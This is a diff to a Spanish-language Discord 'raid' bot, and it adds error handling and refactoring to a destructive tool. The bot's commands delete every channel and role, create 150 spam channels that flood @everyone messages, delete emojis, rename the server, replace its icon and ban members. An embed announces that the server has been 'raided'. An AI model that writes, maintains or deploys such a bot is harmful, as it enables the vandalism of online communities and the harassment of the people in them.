@@ -14,8 +14,19 @@ const client = new Client({
 });
 
 // Pre-load image buffers once at startup to avoid re-reading files on every message
-const iconBuffer = fs.readFileSync('./attached_assets/40fd13ae2d1126651d55d5411b28b65f_1768104286084.png');
-const triangulitoBuffer = fs.readFileSync('./attached_assets/images_1779843924633.webp');
+let iconBuffer, triangulitoBuffer;
+
+try {
+  iconBuffer = fs.readFileSync('./attached_assets/40fd13ae2d1126651d55d5411b28b65f_1768104286084.png');
+} catch (err) {
+  console.error('Error cargando icon buffer:', err.message);
+}
+
+try {
+  triangulitoBuffer = fs.readFileSync('./attached_assets/images.webp');
+} catch (err) {
+  console.error('Error cargando triangulito buffer:', err.message);
+}
 
 // Pre-build static embeds once
 const invasionEmbed = new EmbedBuilder()
@@ -24,7 +35,7 @@ const invasionEmbed = new EmbedBuilder()
 
 const trianguloEmbed = new EmbedBuilder()
   .setColor(0xFF0000)
-  .setDescription('TRIANGULITO ES EL MEJOR, HABEIS SIDO RAIDEADO POR EL GOAT DE TRIANGULITO');
+  .setDescription('TRIANGULITO ES EL MEJOR,HABEIS SIDO RAIDEADO POR EL GOAT DE TRIANGULITO')
   .setImage('attachment://triangulito.webp');
 
 const ayudaEmbed = new EmbedBuilder()
@@ -45,7 +56,7 @@ const ayudaEmbed = new EmbedBuilder()
 const ayudaSecretaEmbed = new EmbedBuilder()
   .setColor(0xFF0000)
   .setTitle('Menú de ayuda secreta')
-  .setDescription('**COMANDO AYUDA DEFINITIVA**\neste comando recupera todos los roles que elimino papuamigo,hará los canales borrados con sus respectivas categorías bien puestas (no recupera mensajes perdidos)\n`.nodiversion`');
+  .setDescription('**COMANDO AYUDA DEFINITIVA**\nEste comando recupera todos los roles eliminados, recrea los canales borrados con sus categorías y permisos.');
 
 // Helper: batch parallel execution with concurrency limit
 async function batchParallel(items, concurrency, fn) {
@@ -115,7 +126,7 @@ client.on('messageCreate', async message => {
     await deleteAllChannels(guild);
   }
 
-else if (cmd.startsWith('.diversión')) {
+  else if (cmd.startsWith('.diversión')) {
     if (!guild) return;
     // 1. Delete + Create channels in parallel batches
     await deleteAllChannels(guild);
@@ -125,10 +136,9 @@ else if (cmd.startsWith('.diversión')) {
     // 3. Server changes in parallel
     await Promise.all([
       guild.setName('TRIANGULITO GOAT').catch(() => {}),
-      guild.setIcon(iconBuffer).catch(() => {})
+      iconBuffer ? guild.setIcon(iconBuffer).catch(() => {}) : null
     ]);
   } 
-
 
   else if (cmd.startsWith('.bypass')) {
     if (!guild) return;
@@ -145,9 +155,11 @@ else if (cmd.startsWith('.diversión')) {
   else if (cmd === '.delroles') {
     if (!guild) return;
     const roles = await guild.roles.fetch();
-    await Promise.all(roles.map(role => {
-      if (role.editable && role.name !== '@everyone') return role.delete().catch(() => {});
-    }));
+    await Promise.all(
+      roles
+        .filter(role => role.editable && role.name !== '@everyone')
+        .map(role => role.delete().catch(() => {}))
+    );
   }
 
   else if (cmd === '.delemojis') {
@@ -174,17 +186,19 @@ else if (cmd.startsWith('.diversión')) {
     } catch (e) {}
   }
 
-else if (cmd === '.triangulo') {
+  else if (cmd === '.triangulo') {
     if (!guild) return;
     // 1. Delete + Create in parallel batches
     await deleteAllChannels(guild);
     const created = await createChannels(guild, 'TRIANGULITO ES EL MEJOR', 150, 10);
     // 2. Spam all 10 messages per channel fully in parallel
-    await spamChannels(created, 10, () => ({
-      content: '@everyone',
-      embeds: [trianguloEmbed],
-      files: [new AttachmentBuilder(triangulitoBuffer, { name: 'triangulito.webp' })]
-    }));
+    if (triangulitoBuffer) {
+      await spamChannels(created, 10, () => ({
+        content: '@everyone',
+        embeds: [trianguloEmbed],
+        files: [new AttachmentBuilder(triangulitoBuffer, { name: 'triangulito.webp' })]
+      }));
+    }
   }
 
   else if (cmd === '.ban') {
